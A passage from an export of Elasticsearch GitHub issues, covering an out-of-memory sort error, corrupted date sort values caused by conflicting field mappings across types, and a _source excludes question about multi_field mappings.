</description><key id="39169334">7102</key><summary>OOM again</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">zouxc</reporter><labels><label>feedback_needed</label></labels><created>2014-07-31T07:25:45Z</created><updated>2014-08-23T15:16:35Z</updated><resolved>2014-08-23T15:16:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T08:24:26Z" id="50730934">Hi @zouxc 

You're getting an OOM error because you are trying to load the value of two fields into memory in order to sort on them, and you don't have enough memory.

What version of Elasticsearch are you using? In recent versions, this should have been caught by the fielddata circuit breaker, which would just have aborted your request instead of running out of memory.

Your choices are:
1. increase your heap size (although you don't want to use more than 32gb or more than 50% of your RAM)
2. Change the fields you want to sort on to use doc values instead of being loaded into memory (just set `doc_values` to `true` in the field mappings
3. Don't sort or aggregate on those fields :)
</comment><comment author="clintongormley" created="2014-08-23T15:16:34Z" id="53155649">No further feedback. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>dataOptionalTime field value corrupted after migrated from ES1.1.1 to 1.2.2</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7101</link><project id="" key="" /><description>We recently migrated our ES 1.1.1 cluster to ES 1.2.2, after that we found that one field 'displayPublishedDateTime', which is defined as dataOptionalTime type in the mapping, seems corrupted and not able to order by it in the query.  
In the query, when order by desc on it, its sort value is '\\b', and order by asc, its sort value is shown as '' \u0001\u0000\u0000\u0000(aC3@X", see the following query and results. In other queries, which order by 'displayPublishedDateTime', the order actually didn't take effect. It looks like that Elasticsearch was unable to get the correct sort value for this field. 

Query

```
GET /doc-v2/_search
{
  "query": {
      "match": {
         "_id": "AAUYRY"
      }
  },
  "_source":[
    "_id",
    "_document.displayPublishedDateTime",
    ],
  "sort": [
    {
      "_document.displayPublishedDateTime": {
        "order": "desc"
      }
    }
  ]
}
```

Results for 'desc'

```
{
   "took": 46,
   "timed_out": false,
   "_shards": {
      "total": 25,
      "successful": 25,
      "failed": 0
   },
   "hits": {
      "total": 1,
      "max_score": null,
      "hits": [
         {
            "_index": "doc-v2",
            "_type": "article",
            "_id": "AAUYRY",
            "_score": null,
            "_source": {
               "_document": {
                  "displayPublishedDateTime": "2014-05-20T06:58:47Z"
               }
            },
            "sort": [
               "\\\b"
            ]
         }
      ]
   }
}
```

Results for 'asc'

```
{
   "took": 78,
   "timed_out": false,
   "_shards": {
      "total": 25,
      "successful": 25,
      "failed": 0
   },
   "hits": {
      "total": 1,
      "max_score": null,
      "hits": [
         {
            "_index": "doc-v2",
            "_type": "article",
            "_id": "AAUYRY",
            "_score": null,
            "_source": {
               "_document": {
                  "displayPublishedDateTime": "2014-05-20T06:58:47Z"
               }
            },
            "sort": [
               " \u0001\u0000\u0000\u0000(aC3@X"
            ]
         }
      ]
   }
}
```
</description><key id="39162838">7101</key><summary>dataOptionalTime field value corrupted after migrated from ES1.1.1 to 1.2.2</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">JeffreyZZ</reporter><labels /><created>2014-07-31T05:18:27Z</created><updated>2014-08-04T18:24:43Z</updated><resolved>2014-08-01T08:04:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T08:14:50Z" id="50729938">Hi @JeffreyZZ 

Please could you attach your mapping:

```
GET /doc-v2/_mapping?pretty
```

thanks
</comment><comment author="JeffreyZZ" created="2014-07-31T16:57:59Z" id="50787110">@clintongormley , here is the mapping. As it's too long so I excluded the duplicate fields. As you can see, for some historical reason, we have two displayPublishedDateTime fields defined, one is starting with a lowercase d and the other one is uppercase D. But we only use the lowercase one. 

{
   "doc-v2": {
      "mappings": {
         "article": {
            "include_in_all": false,
            "_all": {
               "analyzer": "standard"
            },
            "_timestamp": {
               "enabled": true,
               "store": true
            },
            "properties": {
               "_attributes": {
                  "type": "object",
                  "include_in_all": false
               },
               "_document": {
                  "include_in_all": false,
                  "properties": {
                     "$type": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Abstract": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Authors": {
                        "include_in_all": false,
                        "properties": {
                           "Name": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "Body": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "DisplayPublishedDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     }
                     "_locale": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": false
                     },
                     "_mapping": {
                        "include_in_all": false,
                        "properties": {
                           "_filename": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_version": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_name": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "displayPublishedDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     }
                  }
               }
            }
         }
      }
   }
}
</comment><comment author="clintongormley" created="2014-07-31T17:00:41Z" id="50787472">Hi @JeffreyZZ 

I actually wanted to see all the duplicate fields.  My suspicion is that you have the same field defined twice: once as a date and once as a string.  And I think that when you aggregate on that field, and it loads the values into memory, it is interpreting it as a string.

If you have the same field name in different types, they should have the same mapping.
</comment><comment author="JeffreyZZ" created="2014-07-31T17:19:05Z" id="50789882">Hi, @clintongormley, thanks for the advice. Here is the full mappings for article type. I checked that there were 3 duplicates of displayPublishedDateTime in it, but they were all of the same mapping. What's more, this mapping has been used for a while in ES 1.1.1. Recently we updated our cluster to ES 1.2.2 with JVM G1 GC. But we found that G1 GC didn't give us good search performance, so we update JVM GC to CMS. It was during this period that we started to notice this order on displayPublishedDateTime issue. But I suppose that changing JVM GC shouldn't have any impact on index content. 

```
{
   "doc-v2": {
      "mappings": {
         "article": {
            "include_in_all": false,
            "_all": {
               "analyzer": "standard"
            },
            "_timestamp": {
               "enabled": true,
               "store": true
            },
            "properties": {
               "_attributes": {
                  "type": "object",
                  "include_in_all": false
               },
               "_contentSize": {
                  "type": "long",
                  "include_in_all": false
               },
               "_document": {
                  "include_in_all": false,
                  "properties": {
                     "$type": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Abstract": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Authors": {
                        "include_in_all": false,
                        "properties": {
                           "Name": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "Body": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "DisplayPublishedDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     },
                     "ExcludedExperiences": {
                        "include_in_all": false,
                        "properties": {
                           "Canvas": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "Platform": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "ExcludedLocales": {
                        "include_in_all": false,
                        "properties": {
                           "Publishing": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "ExcludedVerticals": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Facets": {
                        "include_in_all": false,
                        "properties": {
                           "Key": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "Values": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "Resources": {
                        "include_in_all": false,
                        "properties": {
                           "ContentType": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "Reference": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           }
                        }
                     },
                     "Seo": {
                        "include_in_all": false,
                        "properties": {
                           "CanonicalAuthority": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "DisallowIndexing": {
                              "type": "boolean"
                           },
                           "ExcludeFromSiteMap": {
                              "type": "boolean"
                           }
                        }
                     },
                     "SourceId": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "SubscriptionType": {
                        "type": "long",
                        "include_in_all": false
                     },
                     "Subtitle": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "Title": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_contentSize": {
                        "type": "long",
                        "include_in_all": false
                     },
                     "_createdDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_expirationDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_id": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_isPublishingLocked": {
                        "type": "boolean"
                     },
                     "_lastEditedDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_lastPublishedDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_lastPublishedSequence": {
                        "type": "long",
                        "include_in_all": false
                     },
                     "_linkIds": {
                        "include_in_all": false,
                        "properties": {
                           "directPredecessorIds": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "sectionIds": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_links": {
                        "include_in_all": false,
                        "properties": {
                           "_createdDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_expirationDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_id": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_lastEditedDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_lastPublishedDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_lastPublishedSequence": {
                              "type": "long",
                              "include_in_all": false
                           },
                           "_locale": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_name": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_systemTags": {
                              "include_in_all": false,
                              "properties": {
                                 "key": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "abstract": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "authors": {
                              "include_in_all": false,
                              "properties": {
                                 "name": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "body": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "displayPublishedDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "facets": {
                              "include_in_all": false,
                              "properties": {
                                 "key": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "values": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "feed": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "provider": {
                                    "include_in_all": false,
                                    "properties": {
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 },
                                 "references": {
                                    "include_in_all": false,
                                    "properties": {
                                       "direction": {
                                          "type": "string",
                                          "include_in_all": false
                                       },
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 },
                                 "self": {
                                    "include_in_all": false,
                                    "properties": {
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 }
                              }
                           },
                           "headlines": {
                              "include_in_all": false,
                              "properties": {
                                 "image": {
                                    "include_in_all": false,
                                    "properties": {
                                       "caption": {
                                          "type": "string",
                                          "include_in_all": false
                                       },
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 },
                                 "subtitle": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "title": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "parent": {
                              "include_in_all": false,
                              "properties": {
                                 "direction": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "provider": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "references": {
                              "include_in_all": false,
                              "properties": {
                                 "Direction": {
                                    "type": "long",
                                    "include_in_all": false
                                 },
                                 "direction": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "resources": {
                              "include_in_all": false,
                              "properties": {
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "contentType": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "reference": {
                                    "include_in_all": false,
                                    "properties": {
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 }
                              }
                           },
                           "section": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "self": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "seo": {
                              "include_in_all": false,
                              "properties": {
                                 "canonicalUrl": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "disallowIndexing": {
                                    "type": "boolean"
                                 },
                                 "excludeFromSiteMap": {
                                    "type": "boolean"
                                 },
                                 "keywords": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "sourceId": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "subscriptionType": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "subtitle": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "title": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_locale": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": false
                     },
                     "_mapping": {
                        "include_in_all": false,
                        "properties": {
                           "_filename": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_version": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_name": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "_snippet": {
                        "include_in_all": false,
                        "properties": {
                           "_abstract": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_authors": {
                              "include_in_all": false,
                              "properties": {
                                 "name": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "_expirationDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_id": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_image": {
                              "include_in_all": false,
                              "properties": {
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "_lastEditedDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_lastPublishedDateTime": {
                              "type": "date",
                              "format": "dateOptionalTime",
                              "include_in_all": false
                           },
                           "_provider": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "_title": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "_type": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_systemTags": {
                        "include_in_all": false,
                        "properties": {
                           "Key": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "Values": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "key": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "values": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "abstract": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "authors": {
                        "include_in_all": false,
                        "properties": {
                           "bio": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "image": {
                              "include_in_all": false,
                              "properties": {
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "name": {
                              "type": "string",
                              "fields": {
                                 "ft": {
                                    "type": "string",
                                    "analyzer": "standard"
                                 }
                              },
                              "include_in_all": true
                           }
                        }
                     },
                     "body": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": false
                     },
                     "caption": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "displayName": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "displayPublishedDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     },
                     "excludedExperiences": {
                        "include_in_all": false,
                        "properties": {
                           "canvas": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "platform": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "excludedLocales": {
                        "include_in_all": false,
                        "properties": {
                           "publishing": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "viewing": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "excludedVerticals": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "facets": {
                        "include_in_all": false,
                        "properties": {
                           "key": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "value": {
                              "type": "long",
                              "include_in_all": false
                           },
                           "values": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "friendlyName": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "headlines": {
                        "include_in_all": false,
                        "properties": {
                           "Subtitle": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "Title": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "image": {
                              "include_in_all": false,
                              "properties": {
                                 "attribution": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "direction": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "kicker": {
                              "type": "string",
                              "fields": {
                                 "ft": {
                                    "type": "string",
                                    "analyzer": "standard"
                                 }
                              },
                              "include_in_all": true
                           },
                           "slideshow": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "subtitle": {
                              "type": "string",
                              "fields": {
                                 "ft": {
                                    "type": "string",
                                    "analyzer": "standard"
                                 }
                              },
                              "include_in_all": true
                           },
                           "title": {
                              "type": "string",
                              "fields": {
                                 "ft": {
                                    "type": "string",
                                    "analyzer": "standard"
                                 }
                              },
                              "include_in_all": true
                           }
                        }
                     },
                     "kicker": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "labels": {
                        "type": "object",
                        "include_in_all": false
                     },
                     "related": {
                        "include_in_all": false,
                        "properties": {
                           "link": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "image": {
                                    "include_in_all": false,
                                    "properties": {
                                       "href": {
                                          "type": "string",
                                          "include_in_all": false
                                       }
                                    }
                                 },
                                 "title": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "reference": {
                              "include_in_all": false,
                              "properties": {
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           }
                        }
                     },
                     "resources": {
                        "include_in_all": false,
                        "properties": {
                           "caption": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "contentType": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "href": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "reference": {
                              "include_in_all": false,
                              "properties": {
                                 "attribution": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "direction": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           }
                        }
                     },
                     "seo": {
                        "include_in_all": false,
                        "properties": {
                           "canonicalAuthority": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "canonicalURL": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "canonicalUrl": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "disallowIndexing": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "excludeFromSiteMap": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "keywords": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "sourceHref": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "sourceID": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "sourceId": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "subscriptionType": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "subtitle": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "title": {
                        "type": "string",
                        "fields": {
                           "ft": {
                              "type": "string",
                              "analyzer": "standard"
                           }
                        },
                        "include_in_all": true
                     },
                     "updatedDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     }
                  }
               },
               "_linkIds": {
                  "include_in_all": false,
                  "properties": {
                     "directPredecessorIds": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "sectionIds": {
                        "type": "string",
                        "include_in_all": false
                     }
                  }
               },
               "_mapping": {
                  "include_in_all": false,
                  "properties": {
                     "_filename": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_version": {
                        "type": "string",
                        "include_in_all": false
                     }
                  }
               },
               "_snippet": {
                  "include_in_all": false,
                  "properties": {
                     "_abstract": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_authors": {
                        "include_in_all": false,
                        "properties": {
                           "bio": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "image": {
                              "include_in_all": false,
                              "properties": {
                                 "caption": {
                                    "type": "string",
                                    "include_in_all": false
                                 },
                                 "href": {
                                    "type": "string",
                                    "include_in_all": false
                                 }
                              }
                           },
                           "name": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_expirationDateTime": {
                        "type": "date",
                        "format": "dateOptionalTime",
                        "include_in_all": false
                     },
                     "_feed": {
                        "include_in_all": false,
                        "properties": {
                           "href": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_id": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_image": {
                        "include_in_all": false,
                        "properties": {
                           "attribution": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "caption": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "direction": {
                              "type": "string",
                              "include_in_all": false
                           },
                           "href": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_lastEditedDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_lastPublishedDateTime": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_provider": {
                        "include_in_all": false,
                        "properties": {
                           "href": {
                              "type": "string",
                              "include_in_all": false
                           }
                        }
                     },
                     "_title": {
                        "type": "string",
                        "include_in_all": false
                     },
                     "_type": {
                        "type": "string",
                        "include_in_all": false
                     }
                  }
               }
            }
         }
      }
   }
}
```
</comment><comment author="JeffreyZZ" created="2014-07-31T23:13:09Z" id="50830929">On the same the index, we ran into the following ClassCastException exception on several shards, hope this information is helpful.  

   "took": 206,
   "timed_out": false,
   "_shards": {
      "total": 25,
      "successful": 20,
      "failed": 5,
      "failures": [
         {
            "index": "ppub-v2",
            "shard": 13,
            "status": 500,
            "reason": "RemoteTransportException[[SEARCH2-17][inet[/10.0.4.15:9300]][search/phase/query]]; nested: QueryPhaseExecutionException[[amp-ppub-v2][13]: query[+ConstantScore(cache(_document.$type:article)) +_document._lastPublishedDateTime:[\* TO 2014-07-29T00:26:16Z]],from[0],size[10],sort[&lt;custom:\"_document.displayPublishedDateTime\": org.elasticsearch.index.fielddata.fieldcomparator.BytesRefFieldComparatorSource@318f2731&gt;!]: Query Failed [Failed to execute main query]]; nested: ClassCastException; "
         }
</comment><comment author="JeffreyZZ" created="2014-08-01T01:12:08Z" id="50838909">We also tried to clean up the index cache with the following command :
        POST doc-v2/_cache/clear

After that, executed the same query, Elasticsearch returned the following error : 

{
   "error": "ReduceSearchPhaseException[Failed to execute phase [query], [reduce] ]; nested: ClassCastException[java.lang.Long cannot be cast to org.apache.lucene.util.BytesRef]; ",
   "status": 503
}
</comment><comment author="dadoonet" created="2014-08-01T02:41:41Z" id="50843537">Could you add your query to this thread?
A full script repro would be awesome.
</comment><comment author="JeffreyZZ" created="2014-08-01T04:02:24Z" id="50846927">@dadoonet  here is the query I used. There is a simple one that is at the top of this thread.

GET /doc-v2/_search
{
  "query": {
    "bool": {
      "must": [
        {
          "filtered": {
            "filter": {
              "terms": {
                "_document.$type": [
                  "article"
                ]
              }
            }
          }
        },
        {
          "range": {
            "_document._lastPublishedDateTime": {
              "to": "2014-07-29T00:26:16Z"
            }
          }
        }
      ]
    }
  },
  "size": 100, 
  "_source":[
    "_id",
    "_document.displayPublishedDateTime",
    "_document._lastPublishedDateTime"
    ],
  "sort": [
    {
      "_document.displayPublishedDateTime": {
        "order": "desc"
      }
    }
  ]
}
</comment><comment author="clintongormley" created="2014-08-01T07:32:44Z" id="50857069">Hi @JeffreyZZ 

You said: 

&gt; Here is the full mappings for article type. I checked that there were 3 duplicates of displayPublishedDateTime in it, but they were all of the same mapping. 

But what about other instances of displayPublishedDateTime in **other types** in the same index?  That's where I think things are going wrong.  And the `ClassCastException[java.lang.Long cannot be cast to org.apache.lucene.util.BytesRef]` that you report further evidence of that.

Somewhere ES is getting confused about the type of data in that field.  Going from numeric -&gt; string gives you the weird strings, and trying to go from string -&gt; numeric gives you the cast exceptions.
</comment><comment author="JeffreyZZ" created="2014-08-01T07:54:22Z" id="50858613">Hi, @clintongormley,
I did a further check that we do have displayPublishedDateTime, which is of string type but dateOptionalTime, defined in other types in the same index. Does this mean that Elasticsearch is unable to handle the case where the same field of different data types are placed different type in the same index?  
</comment><comment author="clintongormley" created="2014-08-01T08:04:09Z" id="50859377">Correct.  All fields with the same name in the same index are stored in the same place. In the future, we will throw an exception if fields with the same name in different types have different mappings.
</comment><comment author="JeffreyZZ" created="2014-08-04T18:19:00Z" id="51097014">Hi, @clintongormley , this would be a big concern for us to use Elasticsearch, because we don't have the full control over the data ingested into our Elasticsearch cluster, so it could be easy that the poison data, which has the same field of different type, is unintentionally ingested into the cluster. 
Do you have any idea about how to control this for the current release, such as 1.2.2?
And ETA to implement the exception when fields with the same name in different types have different mappings?
</comment><comment author="clintongormley" created="2014-08-04T18:24:43Z" id="51097752">Hi @JeffreyZZ - currently all you can do is to turn off dynamic mapping, so that new fields aren't created automatically. That would prevent creating incompatible field mappings, because it would prevent creating any new fields automatically, which may be a problem for you.

Btw, this is nothing new.  This issue has been in Elasticsearch since the very beginning. So the change we are planning is just to enforce the advice that we have given previously.  It's a breaking change, so it won't happen before v2.0.0. and no, i have no idea when that will be released :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>_source excludes do not work for multi_field</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7100</link><project id="" key="" /><description>I tried setting up an exclude on the subject field and the field is still included in the source.
I suspect that this is due to the multi_field setting as it works well to exclude other fields.

```
{
  "index_template": {
    "mappings": {
      "document": {
        "_source": {
          "excludes": [
            "subject"
          ]
        },
        "properties": {
          "subject": {
            "type": "multi_field",
            "fields": {
              "subject": {
                "type": "string",
                "index": "analyzed"
              },
              "raw": {
                "type": "string",
                "index": "not_analyzed"
              }
            }
          }
        }
      }
    }
  }
}
```
</description><key id="39139754">7100</key><summary>_source excludes do not work for multi_field</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Asimov4</reporter><labels /><created>2014-07-30T21:35:47Z</created><updated>2014-07-31T08:09:20Z</updated><resolved>2014-07-31T08:09:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T08:09:20Z" id="50729345">Hi @Asimov4 

Actually, your mapping works as expected:

```
DELETE /test 

PUT /test 
{
  "mappings": {
    "document": {
      "_source": {
        "excludes": [
          "subject"
        ]
      },
      "properties": {
        "subject": {
          "type": "multi_field",
